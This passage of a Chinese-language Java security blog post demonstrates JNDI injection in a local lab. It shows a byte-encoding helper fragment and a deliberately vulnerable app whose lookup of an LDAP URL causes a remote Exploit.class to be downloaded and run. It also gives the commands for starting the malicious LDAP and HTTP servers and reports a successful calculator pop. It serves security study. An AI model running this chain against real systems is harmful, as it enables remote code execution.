+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>3</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>--</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>byte</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>byte</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=n>value</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>8</span><span class=p>))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>b</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>started</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>b</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>started</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h3 id=触发受害者jndi注入>触发受害者JNDI注入</h3><p>VulnerableApp.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.jndi</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.InitialContext</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 受害者应用
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 模拟存在 JNDI 注入漏洞的应用程序
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 当 jndiName 可被攻击者控制时，lookup() 会去请求恶意 LDAP 服务器
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * LDAP 服务器返回 Reference → 受害者去 HTTP 服务器下载 Exploit.class → 执行恶意代码
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>VulnerableApp</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;========== 受害者应用启动 ==========&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;模拟存在 JNDI 注入漏洞的场景\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 假设这个 jndiName 来自用户输入，攻击者可以控制</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>jndiName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://127.0.0.1:1389/Exploit&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[受害者] 执行 ctx.lookup(\&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>jndiName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;)&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InitialContext</span><span class=w> </span><span class=n>ctx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InitialContext</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctx</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>jndiName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[受害者] lookup 返回&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h2 id=过程示例>过程示例</h2><p>启动 HTTP 服务器</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525223911246.png alt=image.png loading=lazy decoding=async></figure></p><p>启动恶意 LDAP 服务器</p><p>mvn exec:java &lsquo;-Dexec.mainClass=com.jndi.LdapRefServer&rsquo;</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224550567.png alt=image.png loading=lazy decoding=async></figure></p><p>运行受害者应用</p><p>java -cp &ldquo;target/classes&rdquo; &ldquo;-Dcom.sun.jndi.ldap.object.trustURLCodebase=true&rdquo;</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224709775.png alt=image.png loading=lazy decoding=async></figure></p><p>发现已经成功弹计算机了</p><p>查看ldap服务器进行查看相关情况</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224831909.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/java%E5%AE%89%E5%85%A8/># Java安全</a>
+<a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
